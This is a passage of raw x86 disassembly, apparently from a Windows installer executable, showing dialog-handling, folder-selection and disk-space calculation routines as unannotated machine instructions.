  4049a6:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4049a9:	51                   	push   %ecx
  4049aa:	53                   	push   %ebx
  4049ab:	68 4b 04 00 00       	push   $0x44b
  4049b0:	50                   	push   %eax
  4049b1:	ff d6                	call   *%esi
  4049b3:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  4049b9:	68 02 7f 00 00       	push   $0x7f02
  4049be:	53                   	push   %ebx
  4049bf:	ff d7                	call   *%edi
  4049c1:	50                   	push   %eax
  4049c2:	ff 15 c8 81 40 00    	call   *0x4081c8
  4049c8:	6a 01                	push   $0x1
  4049ca:	ff 75 fc             	push   -0x4(%ebp)
  4049cd:	ff 75 08             	push   0x8(%ebp)
  4049d0:	e8 9a 00 00 00       	call   0x404a6f
  4049d5:	68 00 7f 00 00       	push   $0x7f00
  4049da:	53                   	push   %ebx
  4049db:	ff d7                	call   *%edi
  4049dd:	50                   	push   %eax
  4049de:	ff 15 c8 81 40 00    	call   *0x4081c8
  4049e4:	8b 7d 14             	mov    0x14(%ebp),%edi
  4049e7:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  4049ee:	75 48                	jne    0x404a38
  4049f0:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  4049f7:	75 3f                	jne    0x404a38
  4049f9:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  4049fd:	75 10                	jne    0x404a0f
  4049ff:	53                   	push   %ebx
  404a00:	6a 01                	push   $0x1
  404a02:	68 11 01 00 00       	push   $0x111
  404a07:	ff 35 68 9a 42 00    	push   0x429a68
  404a0d:	ff d6                	call   *%esi
  404a0f:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404a13:	75 0c                	jne    0x404a21
  404a15:	53                   	push   %ebx
  404a16:	53                   	push   %ebx
  404a17:	6a 10                	push   $0x10
  404a19:	ff 35 68 9a 42 00    	push   0x429a68
  404a1f:	ff d6                	call   *%esi
  404a21:	33 c0                	xor    %eax,%eax
  404a23:	40                   	inc    %eax
  404a24:	eb 1e                	jmp    0x404a44
  404a26:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a2d:	75 06                	jne    0x404a35
  404a2f:	ff 05 14 0f 42 00    	incl   0x420f14
  404a35:	8b 7d 14             	mov    0x14(%ebp),%edi
  404a38:	57                   	push   %edi
  404a39:	ff 75 10             	push   0x10(%ebp)
  404a3c:	ff 75 0c             	push   0xc(%ebp)
  404a3f:	e8 24 fc ff ff       	call   0x404668
  404a44:	5f                   	pop    %edi
  404a45:	5e                   	pop    %esi
  404a46:	5b                   	pop    %ebx
  404a47:	c9                   	leave
  404a48:	c2 10 00             	ret    $0x10
  404a4b:	83 3d ec 9a 42 00 00 	cmpl   $0x0,0x429aec
  404a52:	a1 10 0f 42 00       	mov    0x420f10,%eax
  404a57:	75 05                	jne    0x404a5e
  404a59:	a1 44 2f 42 00       	mov    0x422f44,%eax
  404a5e:	6a 01                	push   $0x1
  404a60:	6a 01                	push   $0x1
  404a62:	68 f4 00 00 00       	push   $0xf4
  404a67:	50                   	push   %eax
  404a68:	ff 15 58 82 40 00    	call   *0x408258
  404a6e:	c3                   	ret
  404a6f:	55                   	push   %ebp
  404a70:	8b ec                	mov    %esp,%ebp
  404a72:	83 ec 3c             	sub    $0x3c,%esp
  404a75:	8b 45 08             	mov    0x8(%ebp),%eax
  404a78:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  404a7c:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  404a80:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404a83:	8b 45 0c             	mov    0xc(%ebp),%eax
  404a86:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  404a8d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404a90:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404a93:	50                   	push   %eax
  404a94:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404a9b:	c7 45 d0 bc a3 40 00 	movl   $0x40a3bc,-0x30(%ebp)
  404aa2:	e8 01 12 00 00       	call   0x405ca8
  404aa7:	c9                   	leave
  404aa8:	c2 0c 00             	ret    $0xc
  404aab:	55                   	push   %ebp
  404aac:	8b ec                	mov    %esp,%ebp
  404aae:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404ab5:	56                   	push   %esi
  404ab6:	8b 75 14             	mov    0x14(%ebp),%esi
  404ab9:	75 26                	jne    0x404ae1
  404abb:	ff 76 30             	push   0x30(%esi)
  404abe:	6a 1d                	push   $0x1d
  404ac0:	ff 75 08             	push   0x8(%ebp)
  404ac3:	e8 39 fb ff ff       	call   0x404601
  404ac8:	8b 46 3c             	mov    0x3c(%esi),%eax
  404acb:	c1 e0 0b             	shl    $0xb,%eax
  404ace:	05 00 a0 42 00       	add    $0x42a000,%eax
  404ad3:	50                   	push   %eax
  404ad4:	68 e8 03 00 00       	push   $0x3e8
  404ad9:	ff 75 08             	push   0x8(%ebp)
  404adc:	e8 df 11 00 00       	call   0x405cc0
  404ae1:	56                   	push   %esi
  404ae2:	ff 75 10             	push   0x10(%ebp)
  404ae5:	ff 75 0c             	push   0xc(%ebp)
  404ae8:	e8 7b fb ff ff       	call   0x404668
  404aed:	5e                   	pop    %esi
  404aee:	5d                   	pop    %ebp
  404aef:	c2 10 00             	ret    $0x10
  404af2:	55                   	push   %ebp
  404af3:	8b ec                	mov    %esp,%ebp
  404af5:	83 ec 4c             	sub    $0x4c,%esp
  404af8:	a1 20 1f 42 00       	mov    0x421f20,%eax
  404afd:	53                   	push   %ebx
  404afe:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404b01:	56                   	push   %esi
  404b02:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404b05:	8b 40 38             	mov    0x38(%eax),%eax
  404b08:	c1 e3 0b             	shl    $0xb,%ebx
  404b0b:	81 c3 00 a0 42 00    	add    $0x42a000,%ebx
  404b11:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404b18:	57                   	push   %edi
  404b19:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404b1c:	75 11                	jne    0x404b2f
  404b1e:	53                   	push   %ebx
  404b1f:	68 fb 03 00 00       	push   $0x3fb
  404b24:	e8 9d 11 00 00       	call   0x405cc6
  404b29:	53                   	push   %ebx
  404b2a:	e8 01 1e 00 00       	call   0x406930
  404b2f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404b36:	8b 75 08             	mov    0x8(%ebp),%esi
  404b39:	75 6c                	jne    0x404ba7
  404b3b:	68 fb 03 00 00       	push   $0x3fb
  404b40:	56                   	push   %esi
  404b41:	ff 15 3c 82 40 00    	call   *0x40823c
  404b47:	53                   	push   %ebx
  404b48:	8b f8                	mov    %eax,%edi
  404b4a:	e8 79 14 00 00       	call   0x405fc8
  404b4f:	85 c0                	test   %eax,%eax
  404b51:	74 10                	je     0x404b63
  404b53:	53                   	push   %ebx
  404b54:	e8 a3 14 00 00       	call   0x405ffc
  404b59:	85 c0                	test   %eax,%eax
  404b5b:	75 06                	jne    0x404b63
  404b5d:	53                   	push   %ebx
  404b5e:	e8 ee 13 00 00       	call   0x405f51
  404b63:	53                   	push   %ebx
  404b64:	57                   	push   %edi
  404b65:	89 35 38 8a 42 00    	mov    %esi,0x428a38
  404b6b:	ff 15 1c 82 40 00    	call   *0x40821c
  404b71:	8b 45 14             	mov    0x14(%ebp),%eax
  404b74:	ff 70 34             	push   0x34(%eax)
  404b77:	6a 01                	push   $0x1
  404b79:	56                   	push   %esi
  404b7a:	e8 82 fa ff ff       	call   0x404601
  404b7f:	8b 45 14             	mov    0x14(%ebp),%eax
  404b82:	ff 70 30             	push   0x30(%eax)
  404b85:	6a 14                	push   $0x14
  404b87:	56                   	push   %esi
  404b88:	e8 74 fa ff ff       	call   0x404601
  404b8d:	57                   	push   %edi
  404b8e:	e8 a3 fa ff ff       	call   0x404636
  404b93:	6a 09                	push   $0x9
  404b95:	e8 dc 1e 00 00       	call   0x406a76
  404b9a:	85 c0                	test   %eax,%eax
  404b9c:	0f 84 91 02 00 00    	je     0x404e33
  404ba2:	6a 01                	push   $0x1
  404ba4:	57                   	push   %edi
  404ba5:	ff d0                	call   *%eax
  404ba7:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404bae:	0f 85 d1 00 00 00    	jne    0x404c85
  404bb4:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404bb8:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404bbd:	75 18                	jne    0x404bd7
  404bbf:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404bc2:	c1 e9 10             	shr    $0x10,%ecx
  404bc5:	66 81 f9 00 03       	cmp    $0x300,%cx
  404bca:	0f 85 63 02 00 00    	jne    0x404e33
  404bd0:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404bd7:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404bdc:	0f 85 a3 00 00 00    	jne    0x404c85
  404be2:	6a 07                	push   $0x7
  404be4:	33 c0                	xor    %eax,%eax
  404be6:	59                   	pop    %ecx
  404be7:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404bea:	ff 75 f8             	push   -0x8(%ebp)
  404bed:	f3 ab                	rep stos %eax,%es:(%edi)
  404bef:	bf 48 2f 42 00       	mov    $0x422f48,%edi
  404bf4:	68 20 17 42 00       	push   $0x421720
  404bf9:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404bfc:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404bff:	c7 45 c8 48 4e 40 00 	movl   $0x404e48,-0x38(%ebp)
  404c06:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404c09:	e8 b1 1a 00 00       	call   0x4066bf
  404c0e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404c11:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404c14:	50                   	push   %eax
  404c15:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404c1c:	ff 15 78 81 40 00    	call   *0x408178
  404c22:	85 c0                	test   %eax,%eax
  404c24:	74 58                	je     0x404c7e
  404c26:	50                   	push   %eax
  404c27:	ff 15 a0 82 40 00    	call   *0x4082a0
  404c2d:	53                   	push   %ebx
  404c2e:	e8 1e 13 00 00       	call   0x405f51
  404c33:	a1 70 9a 42 00       	mov    0x429a70,%eax
  404c38:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404c3e:	85 c0                	test   %eax,%eax
  404c40:	74 28                	je     0x404c6a
  404c42:	81 fb 00 48 43 00    	cmp    $0x434800,%ebx
  404c48:	75 20                	jne    0x404c6a
  404c4a:	50                   	push   %eax
  404c4b:	6a 00                	push   $0x0
  404c4d:	e8 6d 1a 00 00       	call   0x4066bf
  404c52:	57                   	push   %edi
  404c53:	bf 00 7a 42 00       	mov    $0x427a00,%edi
  404c58:	57                   	push   %edi
  404c59:	ff 15 00 81 40 00    	call   *0x408100
  404c5f:	85 c0                	test   %eax,%eax
  404c61:	74 07                	je     0x404c6a
  404c63:	57                   	push   %edi
  404c64:	53                   	push   %ebx
  404c65:	e8 34 1a 00 00       	call   0x40669e
  404c6a:	ff 05 38 2f 42 00    	incl   0x422f38
  404c70:	53                   	push   %ebx
  404c71:	68 fb 03 00 00       	push   $0x3fb
  404c76:	56                   	push   %esi
  404c77:	e8 44 10 00 00       	call   0x405cc0
  404c7c:	eb 07                	jmp    0x404c85
  404c7e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404c85:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404c8c:	74 0d                	je     0x404c9b
  404c8e:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404c95:	0f 85 98 01 00 00    	jne    0x404e33
  404c9b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404c9f:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404ca3:	53                   	push   %ebx
  404ca4:	68 fb 03 00 00       	push   $0x3fb
  404ca9:	e8 18 10 00 00       	call   0x405cc6
  404cae:	53                   	push   %ebx
  404caf:	e8 a5 13 00 00       	call   0x406059
  404cb4:	85 c0                	test   %eax,%eax
  404cb6:	75 07                	jne    0x404cbf
  404cb8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404cbf:	be 18 0f 42 00       	mov    $0x420f18,%esi
  404cc4:	53                   	push   %ebx
  404cc5:	56                   	push   %esi
  404cc6:	e8 b7 19 00 00       	call   0x406682
  404ccb:	6a 01                	push   $0x1
  404ccd:	e8 a4 1d 00 00       	call   0x406a76
  404cd2:	85 c0                	test   %eax,%eax
  404cd4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404cd7:	74 3a                	je     0x404d13
  404cd9:	33 c0                	xor    %eax,%eax
  404cdb:	33 ff                	xor    %edi,%edi
  404cdd:	3b c6                	cmp    %esi,%eax
  404cdf:	74 32                	je     0x404d13
  404ce1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404ce4:	50                   	push   %eax
  404ce5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404ce8:	50                   	push   %eax
  404ce9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404cec:	50                   	push   %eax
  404ced:	56                   	push   %esi
  404cee:	ff 55 f4             	call   *-0xc(%ebp)
  404cf1:	85 c0                	test   %eax,%eax
  404cf3:	75 76                	jne    0x404d6b
  404cf5:	85 ff                	test   %edi,%edi
  404cf7:	74 03                	je     0x404cfc
  404cf9:	66 21 07             	and    %ax,(%edi)
  404cfc:	56                   	push   %esi
  404cfd:	e8 9b 12 00 00       	call   0x405f9d
  404d02:	8b f8                	mov    %eax,%edi
  404d04:	66 83 27 00          	andw   $0x0,(%edi)
  404d08:	4f                   	dec    %edi
  404d09:	4f                   	dec    %edi
  404d0a:	3b fe                	cmp    %esi,%edi
  404d0c:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404d11:	75 ce                	jne    0x404ce1
  404d13:	53                   	push   %ebx
  404d14:	56                   	push   %esi
  404d15:	e8 68 19 00 00       	call   0x406682
  404d1a:	56                   	push   %esi
  404d1b:	e8 dc 12 00 00       	call   0x405ffc
  404d20:	33 ff                	xor    %edi,%edi
  404d22:	3b c7                	cmp    %edi,%eax
  404d24:	74 03                	je     0x404d29
  404d26:	66 89 38             	mov    %di,(%eax)
  404d29:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404d2c:	50                   	push   %eax
  404d2d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404d30:	50                   	push   %eax
  404d31:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404d34:	50                   	push   %eax
  404d35:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404d38:	50                   	push   %eax
  404d39:	56                   	push   %esi
  404d3a:	ff 15 90 80 40 00    	call   *0x408090
  404d40:	85 c0                	test   %eax,%eax
  404d42:	74 43                	je     0x404d87
  404d44:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404d47:	be 00 04 00 00       	mov    $0x400,%esi
  404d4c:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404d50:	56                   	push   %esi
  404d51:	ff 75 f4             	push   -0xc(%ebp)
  404d54:	50                   	push   %eax
  404d55:	ff 15 48 81 40 00    	call   *0x408148
  404d5b:	99                   	cltd
  404d5c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404d5f:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404d62:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404d69:	eb 21                	jmp    0x404d8c
  404d6b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404d6e:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404d71:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404d75:	c1 e9 0a             	shr    $0xa,%ecx
  404d78:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404d7b:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404d7e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404d85:	33 ff                	xor    %edi,%edi
  404d87:	be 00 04 00 00       	mov    $0x400,%esi
  404d8c:	6a 05                	push   $0x5
  404d8e:	e8 fc 01 00 00       	call   0x404f8f
  404d93:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404d96:	74 19                	je     0x404db1
  404d98:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404d9b:	33 c9                	xor    %ecx,%ecx
  404d9d:	3b d1                	cmp    %ecx,%edx
  404d9f:	77 10                	ja     0x404db1
  404da1:	72 07                	jb     0x404daa
  404da3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404da6:	3b c8                	cmp    %eax,%ecx
  404da8:	73 07                	jae    0x404db1
  404daa:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404db1:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  404db7:	39 79 10             	cmp    %edi,0x10(%ecx)
  404dba:	74 30                	je     0x404dec
  404dbc:	50                   	push   %eax
  404dbd:	6a fb                	push   $0xfffffffb
  404dbf:	68 ff 03 00 00       	push   $0x3ff
  404dc4:	e8 ae 01 00 00       	call   0x404f77
  404dc9:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404dcc:	74 10                	je     0x404dde
  404dce:	ff 75 d8             	push   -0x28(%ebp)
  404dd1:	ff 75 d4             	push   -0x2c(%ebp)
  404dd4:	6a fc                	push   $0xfffffffc
  404dd6:	56                   	push   %esi
  404dd7:	e8 d2 00 00 00       	call   0x404eae
  404ddc:	eb 0e                	jmp    0x404dec
  404dde:	68 08 0f 42 00       	push   $0x420f08
  404de3:	56                   	push   %esi
  404de4:	ff 75 08             	push   0x8(%ebp)
  404de7:	e8 d4 0e 00 00       	call   0x405cc0
  404dec:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404def:	3b c7                	cmp    %edi,%eax
  404df1:	a3 04 9b 42 00       	mov    %eax,0x429b04
  404df6:	75 0a                	jne    0x404e02
  404df8:	6a 07                	push   $0x7
  404dfa:	e8 0c c6 ff ff       	call   0x40140b
  404dff:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404e02:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404e05:	85 70 14             	test   %esi,0x14(%eax)
  404e08:	74 03                	je     0x404e0d
  404e0a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404e0d:	33 c0                	xor    %eax,%eax
  404e0f:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404e12:	0f 94 c0             	sete   %al
  404e15:	50                   	push   %eax
  404e16:	e8 08 f8 ff ff       	call   0x404623
  404e1b:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404e1e:	75 0d                	jne    0x404e2d
  404e20:	39 3d 38 2f 42 00    	cmp    %edi,0x422f38
  404e26:	75 05                	jne    0x404e2d
  404e28:	e8 1e fc ff ff       	call   0x404a4b
  404e2d:	89 3d 38 2f 42 00    	mov    %edi,0x422f38
  404e33:	ff 75 14             	push   0x14(%ebp)
  404e36:	ff 75 10             	push   0x10(%ebp)
  404e39:	ff 75 0c             	push   0xc(%ebp)
  404e3c:	e8 27 f8 ff ff       	call   0x404668
  404e41:	5f                   	pop    %edi
  404e42:	5e                   	pop    %esi
  404e43:	5b                   	pop    %ebx
  404e44:	c9                   	leave
  404e45:	c2 10 00             	ret    $0x10
  404e48:	55                   	push   %ebp
  404e49:	8b ec                	mov    %esp,%ebp
  404e4b:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404e4f:	56                   	push   %esi
  404e50:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404e56:	75 1c                	jne    0x404e74
  404e58:	ff 75 14             	push   0x14(%ebp)
  404e5b:	68 fb 03 00 00       	push   $0x3fb
  404e60:	e8 61 0e 00 00       	call   0x405cc6
  404e65:	ff 75 14             	push   0x14(%ebp)
  404e68:	6a 01                	push   $0x1
  404e6a:	68 67 04 00 00       	push   $0x467
  404e6f:	ff 75 08             	push   0x8(%ebp)
  404e72:	ff d6                	call   *%esi
  404e74:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404e78:	75 2d                	jne    0x404ea7
  404e7a:	ff 75 14             	push   0x14(%ebp)
  404e7d:	ff 75 10             	push   0x10(%ebp)
  404e80:	ff 15 74 81 40 00    	call   *0x408174
  404e86:	85 c0                	test   %eax,%eax
  404e88:	74 0e                	je     0x404e98
  404e8a:	6a 07                	push   $0x7
  404e8c:	e8 7a c5 ff ff       	call   0x40140b
  404e91:	85 c0                	test   %eax,%eax
  404e93:	75 03                	jne    0x404e98
  404e95:	40                   	inc    %eax
  404e96:	eb 02                	jmp    0x404e9a
  404e98:	33 c0                	xor    %eax,%eax
  404e9a:	50                   	push   %eax
  404e9b:	6a 00                	push   $0x0
  404e9d:	68 65 04 00 00       	push   $0x465
  404ea2:	ff 75 08             	push   0x8(%ebp)
  404ea5:	ff d6                	call   *%esi
  404ea7:	33 c0                	xor    %eax,%eax
  404ea9:	5e                   	pop    %esi
  404eaa:	5d                   	pop    %ebp
  404eab:	c2 10 00             	ret    $0x10
  404eae:	55                   	push   %ebp
  404eaf:	8b ec                	mov    %esp,%ebp
  404eb1:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404eb7:	8b 45 14             	mov    0x14(%ebp),%eax
  404eba:	53                   	push   %ebx
  404ebb:	56                   	push   %esi
  404ebc:	8b 75 10             	mov    0x10(%ebp),%esi
  404ebf:	57                   	push   %edi
  404ec0:	6a dc                	push   $0xffffffdc
  404ec2:	85 c0                	test   %eax,%eax
  404ec4:	5b                   	pop    %ebx
  404ec5:	74 0b                	je     0x404ed2
  404ec7:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404ecb:	c1 e8 14             	shr    $0x14,%eax
  404ece:	33 ff                	xor    %edi,%edi
  404ed0:	eb 4e                	jmp    0x404f20
  404ed2:	6a 14                	push   $0x14
  404ed4:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404eda:	59                   	pop    %ecx
  404edb:	8b c6                	mov    %esi,%eax
  404edd:	73 06                	jae    0x404ee5
  404edf:	6a 0a                	push   $0xa
  404ee1:	59                   	pop    %ecx
  404ee2:	6a dd                	push   $0xffffffdd
  404ee4:	5b                   	pop    %ebx
  404ee5:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404eeb:	73 05                	jae    0x404ef2
  404eed:	6a de                	push   $0xffffffde
  404eef:	33 c9                	xor    %ecx,%ecx
  404ef1:	5b                   	pop    %ebx
  404ef2:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404ef8:	73 0d                	jae    0x404f07
  404efa:	33 c0                	xor    %eax,%eax
  404efc:	6a 14                	push   $0x14
  404efe:	40                   	inc    %eax
  404eff:	5f                   	pop    %edi
  404f00:	d3 e0                	shl    %cl,%eax
  404f02:	99                   	cltd
  404f03:	f7 ff                	idiv   %edi
  404f05:	03 c6                	add    %esi,%eax
  404f07:	8b f0                	mov    %eax,%esi
  404f09:	25 ff ff ff 00       	and    $0xffffff,%eax
  404f0e:	6a 0a                	push   $0xa
  404f10:	33 d2                	xor    %edx,%edx
  404f12:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404f15:	03 c0                	add    %eax,%eax
  404f17:	d3 e8                	shr    %cl,%eax
  404f19:	d3 ee                	shr    %cl,%esi
  404f1b:	59                   	pop    %ecx
  404f1c:	f7 f1                	div    %ecx
  404f1e:	8b fa                	mov    %edx,%edi
  404f20:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404f23:	6a df                	push   $0xffffffdf
  404f25:	50                   	push   %eax
  404f26:	e8 94 17 00 00       	call   0x4066bf
  404f2b:	50                   	push   %eax
  404f2c:	8d 45 80             	lea    -0x80(%ebp),%eax
  404f2f:	53                   	push   %ebx
  404f30:	50                   	push   %eax
  404f31:	e8 89 17 00 00       	call   0x4066bf
  404f36:	50                   	push   %eax
  404f37:	57                   	push   %edi
  404f38:	56                   	push   %esi
  404f39:	68 c8 a3 40 00       	push   $0x40a3c8
  404f3e:	ff 75 0c             	push   0xc(%ebp)
  404f41:	be 48 2f 42 00       	mov    $0x422f48,%esi
  404f46:	56                   	push   %esi
  404f47:	e8 73 17 00 00       	call   0x4066bf
  404f4c:	56                   	push   %esi
  404f4d:	8b f8                	mov    %eax,%edi
  404f4f:	e8 44 17 00 00       	call   0x406698
  404f54:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404f57:	50                   	push   %eax
  404f58:	ff 15 2c 82 40 00    	call   *0x40822c
  404f5e:	83 c4 18             	add    $0x18,%esp
  404f61:	56                   	push   %esi
  404f62:	ff 75 08             	push   0x8(%ebp)
  404f65:	ff 35 38 8a 42 00    	push   0x428a38
  404f6b:	e8 50 0d 00 00       	call   0x405cc0
  404f70:	5f                   	pop    %edi
  404f71:	5e                   	pop    %esi
  404f72:	5b                   	pop    %ebx
  404f73:	c9                   	leave
  404f74:	c2 10 00             	ret    $0x10
  404f77:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404f7b:	33 c9                	xor    %ecx,%ecx
  404f7d:	51                   	push   %ecx
  404f7e:	50                   	push   %eax
  404f7f:	ff 74 24 10          	push   0x10(%esp)
  404f83:	ff 74 24 10          	push   0x10(%esp)
  404f87:	e8 22 ff ff ff       	call   0x404eae
  404f8c:	c2 0c 00             	ret    $0xc
  404f8f:	8b 15 8c 9a 42 00    	mov    0x429a8c,%edx
  404f95:	8b 0d 88 9a 42 00    	mov    0x429a88,%ecx
  404f9b:	33 c0                	xor    %eax,%eax
  404f9d:	85 d2                	test   %edx,%edx
  404f9f:	74 18                	je     0x404fb9
  404fa1:	56                   	push   %esi
  404fa2:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404fa6:	74 07                	je     0x404faf
  404fa8:	8b 74 24 08          	mov    0x8(%esp),%esi
  404fac:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404faf:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404fb5:	4a                   	dec    %edx
  404fb6:	75 ea                	jne    0x404fa2
  404fb8:	5e                   	pop    %esi
  404fb9:	c2 04 00             	ret    $0x4
  404fbc:	55                   	push   %ebp
  404fbd:	8b ec                	mov    %esp,%ebp
  404fbf:	83 ec 38             	sub    $0x38,%esp
  404fc2:	56                   	push   %esi
  404fc3:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404fc9:	57                   	push   %edi
  404fca:	8b 7d 08             	mov    0x8(%ebp),%edi
  404fcd:	6a 00                	push   $0x0
  404fcf:	6a 09                	push   $0x9
  404fd1:	68 0a 11 00 00       	push   $0x110a
  404fd6:	57                   	push   %edi
  404fd7:	ff d6                	call   *%esi
  404fd9:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404fdd:	74 3c                	je     0x40501b
  404fdf:	ff 15 bc 81 40 00    	call   *0x4081bc
  404fe5:	0f bf c8             	movswl %ax,%ecx
  404fe8:	c1 e8 10             	shr    $0x10,%eax
  404feb:	0f bf c0             	movswl %ax,%eax
  404fee:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ff1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404ff4:	50                   	push   %eax
  404ff5:	57                   	push   %edi
  404ff6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404ff9:	ff 15 ec 81 40 00    	call   *0x4081ec
  404fff:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405002:	50                   	push   %eax
  405003:	6a 00                	push   $0x0
  405005:	68 11 11 00 00       	push   $0x1111
  40500a:	57                   	push   %edi
  40500b:	ff d6                	call   *%esi
  40500d:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  405011:	75 05                	jne    0x405018
  405013:	83 c8 ff             	or     $0xffffffff,%eax
  405016:	eb 1e                	jmp    0x405036
  405018:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40501b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40501e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405021:	50                   	push   %eax
  405022:	6a 00                	push   $0x0
  405024:	68 3e 11 00 00       	push   $0x113e
  405029:	57                   	push   %edi
  40502a:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  405031:	ff d6                	call   *%esi
  405033:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405036:	5f                   	pop    %edi
  405037:	5e                   	pop    %esi
  405038:	c9                   	leave
  405039:	c2 08 00             	ret    $0x8
  40503c:	56                   	push   %esi
  40503d:	57                   	push   %edi
  40503e:	be 00 a0 42 00       	mov    $0x42a000,%esi
  405043:	bf 48 2f 42 00       	mov    $0x422f48,%edi
  405048:	56                   	push   %esi
  405049:	57                   	push   %edi
  40504a:	e8 33 16 00 00       	call   0x406682
  40504f:	ff 74 24 10          	push   0x10(%esp)
  405053:	56                   	push   %esi
  405054:	e8 70 15 00 00       	call   0x4065c9
  405059:	ff 74 24 0c          	push   0xc(%esp)
  40505d:	e8 a9 c3 ff ff       	call   0x40140b
  405062:	57                   	push   %edi
  405063:	56                   	push   %esi
  405064:	e8 19 16 00 00       	call   0x406682
  405069:	5f                   	pop    %edi
  40506a:	5e                   	pop    %esi
  40506b:	c2 08 00             	ret    $0x8
  40506e:	55                   	push   %ebp
  40506f:	8b ec                	mov    %esp,%ebp
  405071:	83 ec 54             	sub    $0x54,%esp
  405074:	53                   	push   %ebx
  405075:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405078:	56                   	push   %esi
